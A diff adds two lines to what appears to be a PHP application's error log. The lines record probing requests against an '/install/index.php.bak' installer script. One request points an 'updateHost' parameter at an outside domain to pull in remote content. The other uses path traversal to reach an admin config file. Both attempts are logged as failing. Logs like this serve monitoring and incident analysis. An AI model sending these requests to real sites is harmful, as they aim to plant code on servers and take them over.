@@ -1,0 +1,6 @@
+[ 2020-05-29T05:51:11+08:00 ] 115.237.75.124 /install/index.php.bak?step=11&insLockfile=a&s_lang=a&install_demo_name=demodata.php&updateHost=http://acedgwf.cn/
+ERR: 无法加载控制器:Index.php
+
+[ 2020-05-29T20:44:39+08:00 ] 101.21.149.3 /install/index.php.bak?step=11&insLockfile=x&s_lang=x&install_demo_name=../data/admin/config_update.php
+ERR: 无法加载控制器:Index.php
+
